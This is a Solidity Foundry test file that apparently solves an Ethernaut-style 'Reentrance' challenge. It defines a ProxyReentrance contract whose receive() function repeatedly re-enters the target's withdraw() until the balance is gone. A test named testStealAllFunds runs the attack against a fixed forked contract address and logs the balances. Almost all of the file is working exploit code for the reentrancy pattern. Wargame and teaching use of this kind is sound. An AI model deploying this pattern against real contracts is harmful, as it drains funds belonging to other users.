// SPDX-License-Identifier: UNLICENSED

// forge test --contracts src/test/King.t.sol --fork-url $rpc -vvvv
pragma solidity ^0.6.0;

import "ds-test/test.sol";
import "forge-std/console.sol";
import "forge-std/Vm.sol";
import "../Reentrancy.sol";

contract ProxyReentrance {
    Reentrance obj;
    constructor(address payable addr) public {
        obj = Reentrance(addr);
    }
    receive() external payable {
        if (address(obj).balance > 0) {
            obj.withdraw(1000000000000000);
        }
    }
    function donate() public payable {
        obj.donate{value: msg.value}(address(this));         
    }
    function hack() public payable {  
        obj.withdraw(1000000000000000);
    }
}
contract ReentranceTest is DSTest {
    Reentrance obj;
    ProxyReentrance proxy_reentrance;
    Vm vm = Vm(HEVM_ADDRESS);
    address player_address;
    address payable contract_address;
    function setUp() public {
        contract_address = 0xb37A19A5C782AbF52aDD890fFc7942d687faf704;
        player_address = 0xae22f26D5ddfE22d24aA28AEB1D44c962c673438;
        obj = Reentrance(contract_address);
        proxy_reentrance = new ProxyReentrance(contract_address);
    }

    function testStealAllFunds() public {      
        proxy_reentrance.donate{value: 1000000000000000}();
        console.log("Proxy reentrance Address =", address(proxy_reentrance));
        console.log("reentrance initial balance =", address(obj).balance);   
        console.log("ProxyReentrance initial balance =", address(proxy_reentrance).balance);   
        proxy_reentrance.hack();
        
        console.log("reentrance end balance =", address(obj).balance);   
        console.log("ProxyReentrance end balance =", address(proxy_reentrance).balance);   
    }
}
